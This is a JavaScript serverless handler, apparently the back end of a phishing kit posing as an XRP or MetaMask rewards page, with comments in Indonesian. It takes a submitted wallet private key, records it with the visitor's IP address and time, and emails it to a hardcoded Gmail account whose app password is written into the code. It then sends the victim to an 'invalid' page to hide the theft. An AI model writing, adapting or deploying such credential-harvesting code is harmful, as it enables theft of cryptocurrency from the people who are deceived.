const fs = require("fs");
const nodemailer = require("nodemailer");

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 400,
      body: "Permintaan tidak valid",
    };
  }

  try {
    // Ambil data dari form
    const { PrivateKey } = JSON.parse(event.body);

    if (!PrivateKey) {
      return {
        statusCode: 400,
        body: "Private Key kosong atau tidak valid",
      };
    }

    // Ambil waktu dan alamat IP pengirim
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ipAddress = event.headers["x-forwarded-for"] || "IP tidak diketahui";

    // Format data
    const data = `PrivateKey    : ${PrivateKey}\n\nWaktu        : ${waktu}\nIP Address   : ${ipAddress}\n-------------------------\n`;

    // Simpan data ke file (simulasi penyimpanan)
    const filePath = "/tmp/BDFBREWQ7HJA7453BF986_______.txt";
    fs.appendFileSync(filePath, data);

    // Kirim email (pastikan SMTP dikonfigurasi)
    const transporter = nodemailer.createTransport({
      service: "gmail", // Ubah sesuai dengan layanan email yang digunakan
      auth: {
        user: "sutiknomarkoso@gmail.com", // Ganti dengan email kamu
        pass: "dqef kmty axsz fozy", // Ganti dengan password atau app password
      },
    });

    const mailOptions = {
      from: "sutiknomarkoso@gmail.com",
      to: "sutiknomarkoso@gmail.com",
      subject: "Saran ",
      text: data,
    };

    await transporter.sendMail(mailOptions);

    // Redirect ke halaman sukses
    return {
      statusCode: 302,
      headers: {
        Location: "https://xrprewards.netlify.app/metamask/invalid.html",
      },
    };
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    return {
      statusCode: 500,
      body: "Terjadi kesalahan saat memproses permintaan",
    };
  }
};
